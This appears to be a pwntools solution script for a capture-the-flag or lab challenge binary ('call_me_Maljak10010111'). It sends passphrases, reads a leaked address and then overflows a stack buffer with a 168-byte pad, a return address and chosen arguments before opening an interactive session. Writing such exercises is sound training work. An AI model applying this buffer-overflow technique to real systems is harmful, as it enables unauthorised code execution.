from pwn import *
import vpn_conf

EXE_FILENAME = './call_me_Maljak10010111'
HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT+10)
OFFSET_ESP = 168

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}


def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)

io = start()
io.recv()
io.sendline(b'Color me your color, baby')
io.recv()
io.sendline(b'Color me your car')
io.recv()
io.sendline(b'Color me your color, darling')
target_addr = io.recvline().decode('utf-8')
address = int(target_addr.split('=')[1], 16)
io.recv()
io.sendline(b'a'*OFFSET_ESP + p32(address) + p32(0x2a) + p32(0xca55e77e) + p32(0xc0de) + p32(0xdecade))
io.interactive()
